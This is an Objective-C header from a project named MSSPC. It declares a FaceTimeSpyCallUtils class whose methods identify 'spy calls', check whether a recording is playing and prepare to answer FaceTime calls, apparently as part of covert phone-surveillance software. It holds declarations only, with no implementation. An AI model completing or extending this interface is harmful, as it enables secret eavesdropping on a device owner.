//
//  FaceTimeSpyCallUtils.h
//  MSSPC
//
//  Created by Makara Khloth on 7/9/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "Telephony.h"

@class FaceTimeCall;

@interface FaceTimeSpyCallUtils : NSObject {

}

+ (NSString *) facetimeID: (FaceTimeCall *) aFaceTimeCall;
+ (BOOL) isFaceTimeSpyCall: (NSString *) aFaceTimeID;
+ (BOOL) isFaceTimeRecentSpyCall: (CTCall *) aRecentCall;

+ (BOOL) isRecordingPlaying;

+ (void) prepareToAnswerFaceTimeCall;

@end
